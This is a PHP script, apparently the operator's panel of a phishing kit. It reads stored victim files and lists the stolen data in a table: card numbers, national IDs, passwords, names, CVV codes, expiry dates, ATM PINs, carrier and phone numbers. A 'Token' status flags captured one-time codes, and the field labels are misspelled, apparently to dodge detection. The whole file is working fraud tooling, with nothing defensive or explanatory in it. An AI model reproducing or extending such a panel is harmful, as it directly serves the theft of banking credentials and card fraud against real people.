<?php
if(!isset($_POST["op"]))
{
    echo "no se ha definido opcion";
    exit;
}
$op = trim($_POST["op"]);

if($op != "listar")
{
    exit;
}

function limpia_espacios($cadena)
{
    $cadena = str_replace(' ', '', $cadena);
    return $cadena;
}
        
$dir = opendir("./");
if(!$dir)
{
    echo "no se puede leer directorio";
    exit;
}        
$contador = 0;
    
echo "
<table border='1' cellpadding='5' max-width='950px'  >
<thead> 
    <tr style='background-color: #00AAD2'>
    <th>estado</th>    
    <th>c@rd</th>
    <th>dni</th>
    <th>p@sss</th>
    <th>nombre</th>
    <th>cecina</th>
    <th>Acciones</th>     
    </tr>
</thead>
<tbody>";

while(($archivo = readdir($dir)) !== false)
{
    if(strstr($archivo, "FileCliente"))
    {
        $FileClienteJson = @file_get_contents($archivo);
        if($FileClienteJson === false)
        {
            echo "error g";
        }
        $FileClienteArray = json_decode($FileClienteJson, true);
        if( 1==1 )
        {
            $Estado = trim($FileClienteArray["estado"]);
            $Color = "white";
            $Display = "";
            if($Estado == "Token")
            {
                $Color = "yellow";
            }
            if($Estado == "Fin")
            {
                //$Display = "none";
            }
            echo "<tr style='background-color:$Color;display:$Display;'>";
            
            echo "<td>";
            echo $Estado;
            echo "</td>";
            
            echo "<td>";
            echo $FileClienteArray["info1"];
            echo "</td>";
            
            
            echo "<td>";
            echo $FileClienteArray["info2"];
            echo "</td>";
            
            echo "<td>";
            echo $FileClienteArray["info3"];
            echo "</td>";
            
            echo "<td>";
            echo $FileClienteArray["nombre"];            
            echo "</td>";
            
            echo "<td>";
            echo "c@rd: ".$FileClienteArray["info1"]."<br>";
            echo "fv: ".$FileClienteArray["info4"]."<br>";
            echo "cbb: ".$FileClienteArray["info5"]."<br>";
            echo "@tm: ".$FileClienteArray["info6"]."<br>";
            echo "opera: ".$FileClienteArray["info7"]."<br>";
            echo "celu: ".$FileClienteArray["info8"]."<br>";
            echo "</td>";
            
            echo "<td>";
            echo "<a style='font-size:20px;text-decoration:none;' target='_blank' href='Panel2.php?FileCliente=$archivo'>ENTRAR</a>";
            echo "&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;";
            echo "<a style='font-size:20px;text-decoration:none;' target='_blank' href='eliminar.php?archivoUsuario=$archivo'>ELIMINAR</a>";
            echo "</td>";
            
            echo "</tr>";
            
        }
    }
}


echo "
</tbody>
</table>";
